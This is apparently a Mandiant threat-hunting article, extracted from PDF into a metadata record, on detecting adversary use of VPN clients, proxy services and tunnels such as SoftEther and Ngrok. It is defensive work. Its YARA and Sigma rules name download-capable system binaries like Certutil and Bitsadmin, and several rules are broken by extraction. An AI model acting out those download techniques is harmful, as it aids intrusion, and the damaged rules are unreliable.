{
    "id": "fd8e0c98-672f-4f3a-a7ce-4797f0888338",
    "created_at": "2023-01-12T14:59:15.636514Z",
    "updated_at": "2025-03-27T02:17:16.842452Z",
    "deleted_at": null,
    "sha1_hash": "c04101c033add456e94a22ed3e7d943a6a09f0ac",
    "title": "2022-06-29 - Burrowing your way into VPNs, Proxies, and Tunnels",
    "authors": "",
    "file_creation_date": "2022-07-18T18:07:15Z",
    "file_modification_date": "2022-07-18T18:07:15Z",
    "file_size": 9294902,
    "plain_text": "# Burrowing your way into VPNs, Proxies, and Tunnels\n\n**mandiant.com/resources/burrowing-your-way-into-vpns**\n\n## Why Are We Here?\n\n#### When considering an attack lifecycle from an adversarial perspective, the adversary has a few options on how to proceed at each step. One of questions that needs to be answered is whether the adversary will use publicly known malware (i.e. BEACON), custom built-from-the-ground-up malware (i.e. HAMMERTOSS), or legitimate software and services (i.e. SoftEther Virtual Private Network) that provide the necessary functionality to complete said step. \n\n Each option has upsides and downsides: Publicly known malware can be extremely cheap but also can be easy to detect since it has been in the public eye for some time. Custom malware can be extremely stealthy given its unique code-base but also very expensive in time and/or money given it needs to be developed prior to use. Legitimate software and services can also be stealthy due to their camouflage effect into “normal network activity” but also may not provide precisely the type of functionality desired, since it was not written to be used for the function it is being considered for.\n\n Mandiant has observed all three of these theoretical “options” throughout research and engagements from formidable adversaries, making each method valuable for hunting, collections, and analysis.\n\n However, the purpose of the content you are about to read is to discuss the third and, at some lunch tables, the least discussed option: legitimate Virtual Private Network (VPN) software, proxy services, and localhost tunnels. This content will walk through each of these three remote access methods to further expand the defender’s hunting and detection repertoire against VPN software, proxy services, and tunnels.\n\n## Defining Differences\n\n### Virtual Private Network Software\n\n#### To understand VPN software, one must understand a VPN: A virtual private network is an encrypted connection over the Internet from a device to a network. The encrypted connection helps ensure that sensitive data is safely transmitted. It prevents unauthorized people from eavesdropping on the traffic and allows the user to conduct work remotely.\n\n In the following, VPN software will be defined as any software artifacts which facilitate the use of a VPN connection (SoftEther VPN Client, OpenVPN Client, etc).\n\n\n-----\n\n#### Proxy Services\n\n In computer science a proxy is a server which resides between the client making a request and the requested destination server. Proxies can be used for multiple purposes including network log collection, cache repository, and providing anonymized internet access. A proxy service is an online resource that allows a user to get the benefits of a proxy with none of the infrastructure concerns (RSocks, HideMyAss, Hide.Me, etc). LocalHost Tunneling\n\n Both VPN software and proxy services facilitate the outbound connection from client to server, while localhost tunneling is similar, it facilitates the connection from the external network back to the client. This is done by what is commonly called “exposing localhost” (Ngrok, LocalTunnel, Localhost.Run, etc).\n\n## Detect from all Directions\n\n#### Brainstorming over the different hunt and detection directions led to the following conclusion: Detection of legitimate software and services at this scale cannot be a narrow implementation of a single detection discipline, but rather, expand across multiple disciplines.\n\n### Brainstorming Hunting & Detection Directions\n\n#### Initiating a large-scale hunting and detection operation like this requires brainstorming through the, hopefully many, different hunting and detection options available to each organization. For example: should the organization have no ability to run snort signatures against network traffic then that type of direction can take the backseat to other primary detection methods.\n\n Additionally, when hunting for a technology being utilized as a methodology it is easy to fall into a “whac-a-vendor” type approach focusing on each vendor’s version of the technology (i.e. Detection on SoftEther, NordVPN, Ngrok, etc). This is not a terrible approach, as it has its merits, but is not ideal. In the following sections there will be detections highlighted covering SoftEther VPN, Ngrok, and others. These are covered due to the threat dense nature of their use.The ideal hunting process would use more methodology driven detection, being more vendor agnostic, as highlighted in the following Hunting Direction sections.\n\n## VPN Client Directions\n\n### Files that are wrapped around suspected VPN files\n\n#### Concern: Adversaries may use innocuous files that house these VPN files inside of themselves to masquerade as something other than a remote access software.\n\n Direction: Use detection logic that can peer into the construct of the file itself to identify the VPN artifacts layered below the innocuous files.\n\n The following can be considered hunting detections and directions for a variety of files wrapped around VPN equities and/or VPN files.\n\n Rich Text Format files with Embedded Hex Payloads Open Office XML files with Embedded VPN Target Domains Optical Disc Image (ISO Image) files with VPN File or Domain References Mach Object (Mach-O) file with VPN File or Domain References\n\n### RTF Embedded Hex Payload with Hex VPN File References\n```\nrule M_Hunting_VPNEngine_RTF_Embedded_1 {\n  meta:\n   description = \"Detects a suspicious string often\nused in PE files in a hex encoded object stream along with a VPN or proxy filename in the hex object.\"\n   author = \"Mandiant\"\n   md5 = \"befec87a9742ba8e8f6e61e1133f55fb\"\n  strings:\n   $pe =\n\"546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f6465\" ascii    $mz = /4d5a[azA-Z0-9]{19,21}ffff/      $vpn1 = /56504e[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii\n   $vpn2 =\n/76706e[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii\n   $vpn3 = /70726f7879[a-zA-Z0-9]{0,20}\n(2e657865|2e646c6c)/ ascii\n   $vpn4 = /50726f7879[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii\n   $vpn5\n= /50524f5859[a-zA-Z0-9]{0,20}(2e657865|2e646c6c)/ ascii\n  condition:\n   filesize < 15MB and (uint16(0)\n== 0x5C7B) and ($pe or $mz) and (1 of ($vpn*))\n}\n\n OOXML with Embedded VPN Target Domains\n\n```\n\n-----\n\n```\n    _ g_ g _ _ g _ { p p\nlink in an OOXML with a VPN or proxy domain.\"\n   author = \"Mandiant\"\n  strings:\n  \n$relationship_external = /TargetMode=[\\\"\\']External[\\\"\\']/ ascii nocase wide\n   $anchor = \"\n<Relationships xmlns=\\\"http://schemas.openxmlformats.org/package/2006/relationships\\\">\"\n   $s1 = \"\nTarget=\" ascii nocase\n   $s2 = \" TargetMode=\" ascii nocase\n   $s3 = \" Type=\" ascii nocase\n   $s4 =\n\" Id=\" ascii nocase\n   $re = /Target=[\\\"\\'][^\\\"\\']{0,100}(vpn|proxy).{0,100}/ ascii nocase\n \ncondition:\n    (filesize < 10KB) and $anchor and $relationship_external and (1 of ($s*)) and $re\n}\n\n### ISO Files with VPN File or Domain References\nrule M_Hunting_VPNEngine_ArchiveEngine_ISOWithEmbeddedVPN_1\n{\n  meta:\n    author = \"Mandiant\"\n    description = \"Looking for ISO files with embedded payloads utilizing VPN strings.\"\n    md5 =\n\"4c5f27d28f369da5d5ecce947bb22943\"\n  strings:\n    $s1 = /vpn[^\\.]{0,50}\\.\n(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii nocase fullword\n    $s2 = /proxy[^\\.]{0,50}\\.\n(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii nocase fullword\n    $s3 = /vpn[a-zA-Z0-9\\.]{0,50}\\.\n(com|io|ru|org|net)/ ascii nocase     $s4 = /proxy[a-zA-Z0-9\\.]{0,50}\\.(com|io|ru|org|net)/ ascii\nnocase     $s5 = \"remote access\" ascii nocase wide fullword\n    $s6 = /localhost[^a-zA-Z0-9]\n{0,5}tunnel/ ascii nocase fullword\n  condition:\n    uint32(0x8000) == 0x30444301 and uint32(0x8004)\n== 0x00013130 and any of them\n}\n\n Mach-O Files with VPN File or Domain References\nrule M_Hunting_MacOS_VPNEngine_MachO_FEBeta_1\n{\n  meta:\n    author = \"Mandiant\"\n    description\n= \"This rule looks for Mach-O files with strings indicating relationship with a VPN client or domain.\"\n    md5 = \"6de8cc7217cb3e0c235fcdde83b1140b\"\n  strings:\n    $s1 = /vpn[^\\.]{0,50}\\.\n(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii fullword nocase\n    $s2 = /proxy[^\\.]{0,50}\\.\n(exe|dll|lnk|hta|rtf|ps1|vbs|vbe|pdf|doc)/ ascii fullword nocase\n    $s3 = /vpn[a-zA-Z0-9\\.]{0,50}\\.\n(com|io|ru|org|net)/ ascii nocase\n    $s4 = /proxy[a-zA-Z0-9\\.]{0,50}\\.(com|io|ru|org|net)/ ascii\nnocase\n    $s6 = /localhost[^a-zA-Z0-9]{0,5}tunnel/ ascii fullword nocase\n  condition:\n   \nfilesize < 15MB and (uint32(0) == 0xBEBAFECA or uint32(0) == 0xFEEDFACE or uint32(0) == 0xFEEDFACF or\nuint32(0) == 0xCEFAEDFE) and (1 of them)\n}\n\n OOXML with Embedded Files with VPN Equities\n# author = \"Mandiant\" ; type = \"OOXML\" ; md5 = \"a2d34e8c543aef78766b37dcaa5f7686\"\nM_Hunting_VPNEngine_OOXML_Target_1;Engine:51255,Container:CL_TYPE_ZIP,Target:0;(0&1&2)&\n(3|4|5|6);3c3f786d6c;3c773a646f637\n56d656e74;353436383639373332303730373236663637373236313664;373637303665;35363\n5303465;37303732366637383739;35303732366637383739\n\n Intelligence gathering via VPN client configuration files\n\n#### Concern: Many VPN clients take configuration files as input, the client itself is the concern, however, the configuration files provide intelligence insight and potential pivot points.\n\n Direction: Use file-based analysis to identify common VPN client configuration files in public stores or on systems where these files would not be expected.\n\n### SoftEther VPN Configuration Identification\n{\nmeta:\nauthor = \"Mandiant\"\nmd5 = \"2586bb9e27a4b3da4ed0f5d15883f84e\"\ndescription = \"Rule looks for\nSoftEther config file.\"\nstrings:\n$configfile = \"Software Configuration File\" ascii fullword\n$softether1 =\n\"softether\" ascii fullword nocase\n$softether2 = \"EnableSoftEtherKernelModeDriver\" nocase\n$topFields1 =\n\"ListenerList\"\n$topFields2 = \"LocalBridgeList\"\n$topFields3 = \"ServerConfiguration\"\n$topFields4 =\n\"VirtualHUB\"\ncondition:\nfilesize < 1MB and $configfile and (1 of ($softether*)) and (1 of ($topFields*))\n}\n\n Ngrok VPN Configuration Identification\nrule M_Hunting_VPNEngine_NgrokConfig_1\n{\nmeta:\nauthor = \"Mandiant\"\ndescription = \"Rule looks for Ngrok YML\nconfig file.\"\nmd5 = \"5d1dbfdc47e820605fedabb98cf17dd5\"\nstrings:\n$header = \"authtoken:\" ascii\n$tokenRE =\n/authtoken:\\s+[a-zA-Z0-9]{24,30}_[a-zA-Z0-9]{16,22}/ ascii\n$tunnel = \"tunnels:\" ascii\ncondition:\nfilesize <\n1MB and $header in (0..20) and $tokenRE and $tunnel\n}\nrule M_Hunting_VPNEngine_NgrokConfig_2\n{\nmeta:\nauthor\n= \"Mandiant\"\ndescription = \"Rule looks for Ngrok YML config file.\"\nmd5 = \"5d1dbfdc47e820605fedabb98cf17dd5\"\nstrings:\n$header = \"authtoken:\" ascii\n$tokenRE = /authtoken:\\s[a-zA-Z0-9]{26,30}_[a-zA-Z0-9]{19,22}/ ascii\ncondition:\nfilesize < 1MB and $header at 0 and $tokenRE\n}\n\n```\n\n-----\n\n#### Process execution that is masquerading as something other than what it is, a VPN client or software.\n\n Concern: It is common to see binaries with modified names, like this SoftEther VPN Bridge renamed as iexplore.exe and conhost.exe, and other aspects to mask the true purpose of the file.\n\n Direction: Avoid relying solely on filename-based detections hunting more for methodologies that will detect named or renamed processes, files, etc. Use process-based detection logic to identify switches, actions, and connections common to VPN components. Even lean on string-based equities to identify a binary’s true identity or intent.\n\n SoftEther VPN Detection by Network Connections\n```\ntitle: 'Renamed SoftEtherVPN by Network Connections (METHODOLOGY)'\ndescription: 'Detect the activity of a\nrenamed SoftEther VPN binary by detecting known domain connections.'\nauthor: Mandiant\ndate: '2022-06-15'\nstatus: hunting\nlogsource:\n  product: 'FireEye HX'\ndetection:\n  selectionDomain:\n   \nurlMonitorEvent Hostname|contains:\n      - 'get-my-ip.ddns.softether-network.net'\n      'keepalive.softether.org'\n      - 'update-check.softether-network.net'\n    urlMonitorEvent\nHostname|re: 'vpn[0-9a-zA-Z]{1,50}\\.softether.net'\n  filterProcessName:\n    urlMonitorEvent\nProcess|contains:\n      - 'softether'\n      - 'vpnbridge'\n      - 'vpnclient'\n     \n- 'vpncmgr'\n      - 'vpngateplugin'\n      - 'vpninstall'\n      - 'vpnserver'\n     \n- 'vpnsetup'\n      - 'vpnmgr'\n      - 'zsatunnel'\n  condition: selectionDomain and not\nfilterProcessName\nfields:\n  - \"urlMonitorEvent Process\"\n  - \"urlMonitorEvent Hostname\"\n  \"urlMonitorEvent Type\"\n  - \"urlMonitorEvent Commandline\"\nfalsepositives:\n  - \"Known proxy services like\nZScaler.\"\nlevel: \"medium\"\n\n SoftEther VPN Detection by Registry Modifications\ntitle: 'Renamed SoftEtherVPN by Registry Modifications (METHODOLOGY)'\ndescription: 'Detect the activity of\na SoftEther VPN binary by detecting registry modifications.'\nauthor: Mandiant\ndate: '2022-06-15'\nstatus:\nhunting\nlogsource:\n  product: 'FireEye HX'\ndetection:\n  selectionType:\n    regKeyEvent Type: 1\n \nselectionStaticPath:      regKeyEvent Path|contains: 'System\\CurrentControlSet\\Services\\SEVPNCLIENT'\n  selectionREPath:\n    regKeyEvent Path|re: 'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\[azA-Z0-9_\\s-]{0,100}?SoftEther[a-zA-Z0-9_\\.\\s-]{0,100}'\n  condition: selectionType and\n(selectionStaticPath or selectionREPath)\nfields:\n  - \"regKeyEvent Process\"\n  - \"regKeyEvent Path\"\n  \"regKeyEvent Key\"\n  - \"regKeyEvent Value\"\nfalsepositives:\n  - \"Unknown\"\nlevel: \"medium\"\n\n Generic VPN Switches from Commandline (Hunting)\n\n Hunting for common VPN equities in process commandline switches to include but not limited to vpn, proxy, sstp, and l2tp.\ntitle: 'VPN-like Process with Known Switches (METHODOLOGY)'\ndescription: 'Detect suspected VPN binaries by\nknown commandline switches.'\nauthor: Mandiant\ndate: '2022-06-15'\nstatus: hunting\nlogsource:\n  product:\n'FireEye HX'\ndetection:\n  selectionProcessType:\n    processEvent eventType: \"start\"\n \nselectionSwitchOptions1:\n    processEvent processCmdLine|contains:\n      - ' --vpn'\n      ' --proxy'\n  selectionSwitchOptionsMethod1:\n    processEvent processCmdLine|contains:\n      'ssl'\n      - 'l2tp'\n      - 'sstp'\n  selectionSwitchOptions2:\n    processEvent\nprocessCmdLine|contains:\n      - 'vpn'\n      - 'proxy'\n  selectionSwitchOptionsMethod2:\n    processEvent processCmdLine|contains:\n      - ' --ssl'\n      - ' --l2tp'\n      ' --sstp'\n  condition: selectionProcessType and ((selectionSwitchOptions1 and\nselectionSwitchOptionsMethod1) or (selectionSwitchOptions2 and selectionSwitchOptionsMethod2))\nfields:\n \n- \"processEvent processCmdLine\"\n  - \"processEvent Process\"\n  - \"processEvent Username\"\n  \"processEvent Md5\"\nfalsepositives:\n  - \"Unknown\"\nlevel: \"low\"\n\n Generic VPN Domains from the Process (Hunting)\n\n Identifying processes that initiate a network connection to VPN or proxy domains with the following regular expression.\n\n (vpn|proxy)\\.[^.]{1,100}\\.(net|com|org|io|ru)\n\n This leans heavily on a common practice to use domains in the format of vpn.company[.]com or proxy.company[.]com. While this is not completely inclusive, it leads to enough hunting opportunities to get started and if they are exhausted the regular expression can be loosened.\ntitle: 'Generic VPN Domains from the Process (Hunting)'\ndescription: 'Identifying processes that initiate a\nnetwork connection to VPN or proxy domains with the following regular expression.'\nauthor: Mandiant\ndate:\n'2022-06-15'\nstatus: hunting\nlogsource:\n  product: 'FireEye HX'\ndetection:\n  selectionDomain:\n   \nurlMonitorEvent Hostname|re:\n      - 'vpn\\.[^.]{1,100}\\.(net|com|org|io)'\n      - 'proxy\\.[^.]\n{1,100}\\.(net|com|org|io)'\n  filterProcessName:\n    urlMonitorEvent Process|contains:\n      'proxy' - 'vpn' condition: selectionDomain and not filterProcessName fields: \n```\n\n-----\n\n```\n                                                  yp\n\"urlMonitorEvent Commandline\"\nfalsepositives:\n  - \"Known proxy services like ZScaler.\"\n  - \"Other\nlegitimate in-house proxies.\"\nlevel: \"low\"\n\n#### Generic VPN User Agents from the Process (Hunting)\n\n Identifying the use of legitimate VPN agents leads to a plethora of hunting opportunities. Searching for VPN and proxy keywords within HTTP user-agent strings will drive these opportunities. Applying tuning with a known authorized software list or authorized VPN/proxy domains can reduce false positives.\ntitle: 'Generic VPN User Agents from the Process (Hunting)'\ndescription: 'Searching for VPN and proxy\nkeywords within HTTP user-agent strings.'\nauthor: Mandiant\ndate: '2022-06-15'\nstatus: hunting\nlogsource:\n  product: 'FireEye HX'\ndetection:\n  selectionUserAgent:\n    urlMonitorEvent userAgent|contains:\n      - 'proxy'\n      - 'vpn'\n  filterHostname:\n    urlMonitorEvent Hostname|contains:\n      - 'vpn'\n      - 'proxy'\n  condition: selectionUserAgent and not filterHostname\nfields:\n  - \"urlMonitorEvent Process\"\n  - \"urlMonitorEvent Hostname\"\n  - \"urlMonitorEvent Type\"\n  \"urlMonitorEvent Commandline\"\nfalsepositives:\n  - \"Known proxy services like ZScaler.\"\n  - \"Other\nlegitimate in-house proxies.\"\n  - \"FortiSSLVPN\"\n  - \"GoogleImageProxy\"\n  - \"ESET Security proxy\ndetection\"\nlevel: \"low\"\n\n Generic SoftEther VPN Equities (Hunting)\n\n Utilizing unique equities to detect known SoftEther functionality within a binary will help bypass process name detection and identify functionality - such as with UNC3500 in the use-case discussed below.\nrule M_Hunting_Linux_VPNEngine_GenericSoftEther_1\n{\n  meta:\n    author = \"Mandiant\"\n   \ndescription = \"Rule looks for SoftEther generic terms in samples.\"\n  strings:\n    $domain = \"updatecheck.softether-network.net\" ascii fullword\n    $keepalive = \"keepalive.softether.org\"\n    $vpn =\n\"SoftEther Corporation\" ascii fullword\n  condition:\n    filesize < 10MB and uint32(0) == 0x464c457f\nand all of them\n}\n\n Files or processes that, when executed, reach outbound and download a know VPN client\n\n Concern: There are hundreds of ways to perform remote downloads like using living off the land binaries or via custom code. However, if a process is seen downloading a VPN client in a method that does not follow normal user behavior, the intent may be to utilize this client for malicious behavior.\n\n Direction: Identify outbound connections to download VPN client software by living off the land binaries.\n\n Living off the Land Binaries with VPN Domains\n\n A Living off the Land event describes a computer event in which actors use legitimate software and functions available in the system to perform malicious actions on it. These legitimate software binaries are considered Living off the Land Binaries (LoLBins) and when combined with VPN or proxy methodologies allow for robust and camouflaged operations.\n\n Utilizing process data to hunt for these LoLBins that have download functionality in combination with VPN and proxy domains may lead to identifying their abuse.\ntitle: 'Living off the Land Binaries with VPN Domains (Hunting)'\ndescription: 'Utilizing process data to\nhunt for LoLBins that have download functionality in combination with VPN and proxy domains may lead to\nidentifying their abuse.'\nauthor: Mandiant\ndate: '2022-06-15'\nstatus: hunting\nlogsource:\n  product:\n'FireEye HX'\ndetection:\n  selectionProcessName:\n    urlMonitorEvent Process:\n      'AppInstaller.exe'\n      - 'Bitsadmin.exe'\n      - 'CertOC.exe'\n      - 'CertReq.exe'\n      - 'Certutil.exe'\n      - 'cmdl32.exe'\n      - 'Desktopimgdownldr.exe'\n      'Diantz.exe'\n      - 'Esentutl.exe'\n      - 'Expand.exe'\n      - 'Extrac32.exe'\n      - 'Findstr.exe'\n      - 'Finger.exe'\n      - 'GfxDownloadWrapper.exe'\n      'Hh.exe'\n      - 'Ieexec.exe'\n      - 'Imewdbld.exe'\n      - 'Makecab.exe'\n      'MpCmdRun.exe'\n      - 'PrintBrm.exe'\n      - 'Replace.exe'\n      - 'Squirrel.exe'\n      - 'Wsl.exe'\n      - 'Xwizard.exe'\n  selectionUrl:\n    urlMonitorEvent\nrequestUrl|re: '[a-zA-Z0-9\\.]{0,50}(vpn|proxy)[a-zA-Z0-9\\.]{0,50}\\.exe'\n  condition: selectionProcessName\nand selectionUrl\nfields:\n  - \"urlMonitorEvent Process\"\n  - \"urlMonitorEvent Hostname\"\n  \"urlMonitorEvent requestUrl\"\n  - \"urlMonitorEvent Commandline\"\nfalsepositives:\n  - \"Unknown\"\nlevel:\n\"medium\"\n\n Proxy Service Directions\n\n```\n\n-----\n\n#### Infrastructure configured to receive VPN or proxy connections\n\n Concern: Host-based visibility may be a data source organizations lack, and therefore have difficulty identifying these equities. This leads to lack of detection and hunting directions.\n\n Direction: Moving away from the host and into the internet infrastructure hunting, there are numerous tools and data sources that allow for identifying infrastructure qualities, which may allow analysts to automate the detection of certain VPN endpoints and servers.\n\n Note: This is relevant for all three technologies, VPN clients, proxy services, and tunnels.\n\n The following includes a list of different hunting queries focusing in on specific and generic VPN or proxy infrastructure.\n\n Generic VPN and Proxy Domains Generic VPN Certificates MeFound VPN Service Hide.Me VPN Service OpenVPN Services Cisco IOS SSL VPN Services Wireguard VPN Infrastructure SoftEther VPN Infrastructure Ngrok Service Infrastructure\n\n Generic VPN and Proxy\n\n VPN Domain\n```\nservices.tls.certificates.leaf_data.issuer.common_name:/.*\\.vpn\\..*\\.[a-z]{1,4}/\n\n Proxy Domain\nservices.tls.certificates.leaf_data.issuer.common_name:/.*\\.proxy\\..*\\.[a-z]{1,4}/\n\n Generic VPN Cert CN and Org\n\n Generic VPN Certificate Common Name and Organization\nparsed.issuer.common_name:\"VPN\" and parsed.subject.organization:\"VPN\"\n\n Other VPN Service Domains\n\n MeFound\nservices.tls.certificates.leaf_data.issuer.common_name:/[^\\.]+\\.mefound\\.com/ or\nservices.tls.certificates.leaf_data.subject.common_name:/[^\\.]+\\.mefound\\.com/ or\nservices.tls.certificates.leaf_data.names:/[^\\.]+\\.mefound\\.com/\n\n Hide.Me Proxy Server\nservices.tls.certificates.leaf_data.names:/.*hide\\.me.*/\nservices.tls.certificates.leaf_data.names=hideservers.net\n\n OpenVPN\nservices.tls.certificates.leaf_data.subject.organization:\"ocvpn\" or\nservices.tls.certificates.leaf_data.subject.common_name:\"ocvpn\"\n\n Cisco IOS SSL VPN\nservices.http.response.headers.set_cookie:/webvpn[a-z]*=.*/\n\n Wireguard\n(services.http.response.html_title:/.*WireGuard VPN.*/) or (services.http.response.body:/.*Wireguard\nVPN.*/)\n(services.http.response.html_title:/.*Wireguard.*/ or services.http.response.body:/.*Wireguard.*/) and not\n((services.http.response.html_title:/.*WireGuard VPN.*/) or (services.http.response.body:/.*Wireguard\nVPN.*/)) and not ((services.http.response.html_title:/.*Turnkey WireGuard.*/) or\n(services.http.response.body:/.*Turnkey Wireguard.*/))\n\n SoftEther\n\n SoftEther on Abused IP Space\n\n```\n\n-----\n\n```\n                  _ j _\nautonomous_system.name=`HETZNER-AS`\nservices.tls.certificates.leaf_data.subject.common_name:/.*softether.net/ AND\nautonomous_system.name=`DIGITALOCEAN-ASN`\nservices.tls.certificates.leaf_data.subject.common_name:/.*softether.net/ AND autonomous_system.name=`ASCHOOPA` services.tls.certificates.leaf_data.subject.common_name:/.*\\.softether\\.net/ AND\nautonomous_system.name=`OVH`\n\n#### Untrusted SoftEther Certificates\n\n Untrusted VPN Custom SoftEther Certificates\nparsed.subject.common_name:/vpn[0-9]{1,15}\\.softether\\.net/ AND tags.raw: \"untrusted\" AND NOT\nparsed.subject.common_name:/vpn[0-9]{1,15}\\.softether\\.net/\n\n Untrusted VPN Non-Custom SoftEther Certificates\nparsed.subject.common_name:/vpn[0-9]{1,15}\\.softether\\.net/ AND tags.raw: \"untrusted\"\n\n SoftEther Generic\n\n SoftEther VPN Domain on Certificate\nsame_service(services.tls.certificates.leaf_data.issuer.common_name:/.*\\.softether\\.net/ AND\nservices.port:443)\n\n HTTP/S SoftEther VPN IPs\nsame_service(services.tls.certificates.leaf_data.issuer.common_name:/.*\\.softether\\.net/ AND\n(services.service_name=`HTTP` OR services.extended_service_name=`HTTPS`))\n\n Non-US IP hosting SoftEther VPN domain\nsame_service(services.tls.certificates.leaf_data.subject.common_name:/vpn.*softether.net/ AND NOT\nservices.tls.certificates.leaf_data.issuer.country:\"US\")\n\n Ngrok Domains\n\n Ngrok Domain\nservices.tls.certificates.leaf_data.names:/.*ngrok.*/\n\n Ngrok Inspect Service\nsame_service(services.http.request.uri:/.*inspect.*/ and services.http.request.uri:/.*http.*/ and\nservices.http.response.html_title:\"ngrok\")\n\n ProtonVPN\n\n Proton VPN Services\nservices.tls.certificates.leaf_data.issuer.organizational_unit:protonvpn or\nservices.http.response.html_title:protonvpn\n\n Browser Extensions used for Proxy Services\n\n Concern: Many proxy services have a companion browser extension and, while not commonly observed, may allow an adversary to use this service.\n\n Additionally, adversaries may use loader functionality to access VPN or proxy services via Chrome. This could be observed in PowerShell loader scripts or LNK files where the --load-extension switch can be used with Chrome to load a specific extension.\n\n Direction: Narrow focus in file analysis to browser extension artifacts and then within said artifacts for VPN equities. This can be done directly against browser extension manifest files or portable executable files.\n\n Loading Chrome VPN or Proxy Extension\nrule M_METHODOLOGY_VPNEngine_LoadVPNProxyChromeExtension_1\n{\n  meta:\n    author = \"Mandiant\"\n   \ndescription = \"Hunting rule that looks for files containing strings pertaining to execution of Chrome to\nlaunch an extension with VPN or proxy equities.\"\n  strings:\n    $r1 = /chrome[^\\r\\n]*?--loadextension=/ ascii nocase wide\n    $s1 = \"chrome\" ascii wide\n    $s2 = \"--load-extension=\" ascii\n\n```\n\n-----\n\n```\n        $p p $p p y\ncondition:\n    filesize < 50KB and all of ($s*) and $r1 and ($p1 or $p2)\n}\n\n#### Chrome Extension Manifest File for Proxies\nrule M_Hunting_VPNEngine_ChromeExtensions_1\n{\n  meta:\n    author = \"Mandiant\"\n    md5 =\n\"995f7d9ca805cce59acbeff82ed4adc6\"\n  strings:\n    $manifest1 = \"\\\"manifest_version\\\":\" ascii nocase\n    $manifest2 = \"\\\"name\\\":\" ascii nocase\n    $manifest3 = \"\\\"version\\\":\" ascii nocase\n   \n$optional1 = \"\\\"author\\\":\" ascii nocase\n    $optional2 = \"\\\"browser_action\\\":\" ascii nocase\n   \n$optional3 = \"\\\"content_security_policy\\\":\" ascii nocase\n    $optional4 = \"\\\"default_icon\\\":\" ascii\nnocase\n    $optional5 = \"\\\"default_locale\\\":\" ascii nocase\n    $optional6 = \"\\\"default_title\\\":\"\nascii nocase\n    $optional7 = \"\\\"description\\\":\" ascii nocase\n    $optional8 =\n\"\\\"differential_fingerprint\\\":\" ascii nocase\n    $optional9 = \"\\\"icons\\\":\" ascii nocase\n   \n$optional10 = \"\\\"permissions\\\":\" ascii nocase\n    $optional11 = \"\\\"background\\\":\" ascii nocase\n   \n$anchorre1 = /\\\"default_title\\\": \\\"[^\\\"]{0,100}[pP]roxy[^\\\"]{0,100}\\\"/ ascii     $anchorre2 =\n/\\\"description\\\": \\\"[^\\\"]{0,100}[pP]roxy[^\\\"]{0,100}\\\"/ ascii     $anchorre3 = /\\\"name\\\": \\\"[^\\\"]\n{0,100}[pP]roxy[^\\\"]{0,100}\\\"/ ascii     $anchorre4 = /\\\"short_name\\\": \\\"[^\\\"]{0,100}[pP]roxy[^\\\"]\n{0,100}\\\"/ ascii     $anchorre5 = /\\\"default_title\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/\nascii     $anchorre6 = /\\\"description\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/ ascii    \n$anchorre7 = /\\\"name\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/ ascii     $anchorre8 =\n/\\\"short_name\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/ ascii\n  condition:\n    filesize <\n1MB and $manifest1 and $manifest2 and $manifest3 and (2 of ($optional*)) and (1 of ($anchorre*))\n}\n\n Chrome Extension Equities in a Binary\nrule M_Hunting_VPNEngine_ChromeExtensionInBinary_1\n{\n  meta:\n    author = \"Mandiant\"\n    md5 =\n\"2e09a136e40143ed3317c9ce6ea027a6\"\n  strings:\n    $manifest1 = \"\\\"manifest_version\\\":\" ascii nocase\n    $manifest2 = \"\\\"name\\\":\" ascii nocase\n    $manifest3 = \"\\\"version\\\":\" ascii nocase\n   \n$optional1 = \"\\\"author\\\":\" ascii nocase\n    $optional2 = \"\\\"browser_action\\\":\" ascii nocase\n   \n$optional3 = \"\\\"content_security_policy\\\":\" ascii nocase\n    $optional4 = \"\\\"default_icon\\\":\" ascii\nnocase\n    $optional5 = \"\\\"default_locale\\\":\" ascii nocase\n    $optional6 = \"\\\"default_title\\\":\"\nascii nocase\n    $optional7 = \"\\\"description\\\":\" ascii nocase\n    $optional8 =\n\"\\\"differential_fingerprint\\\":\" ascii nocase\n    $optional9 = \"\\\"icons\\\":\" ascii nocase\n   \n$optional10 = \"\\\"permissions\\\":\" ascii nocase\n    $optional11 = \"\\\"background\\\":\" ascii nocase\n   \n$anchorre1 = /\\\"default_title\\\": \\\"[^\\\"]{0,100}[pP]roxy[^\\\"]{0,100}\\\"/ ascii     $anchorre2 =\n/\\\"description\\\": \\\"[^\\\"]{0,100}[pP]roxy[^\\\"]{0,100}\\\"/ ascii     $anchorre3 = /\\\"name\\\": \\\"[^\\\"]\n{0,100}[pP]roxy[^\\\"]{0,100}\\\"/ ascii     $anchorre4 = /\\\"short_name\\\": \\\"[^\\\"]{0,100}[pP]roxy[^\\\"]\n{0,100}\\\"/ ascii     $anchorre5 = /\\\"default_title\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/\nascii     $anchorre6 = /\\\"description\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/ ascii    \n$anchorre7 = /\\\"name\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/ ascii     $anchorre8 =\n/\\\"short_name\\\": \\\"[^\\\"]{0,100}(VPN|\\s+vpn|vpn\\s+)[^\\\"]{0,100}\\\"/ ascii\n  condition:\n    ((uint16(0)\n== 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) or (uint32(0) == 0x464c457f)) and filesize < 20MB and\n$manifest1 and $manifest2 and $manifest3 and (2 of ($optional*)) and (1 of ($anchorre*))\n}\n\n LocalHost Tunnel Directions\n\n Use of Legitimate Processes\n\n Concern: Many LocalHost Tunnel processes utilize either legitimate processes (SSH) or 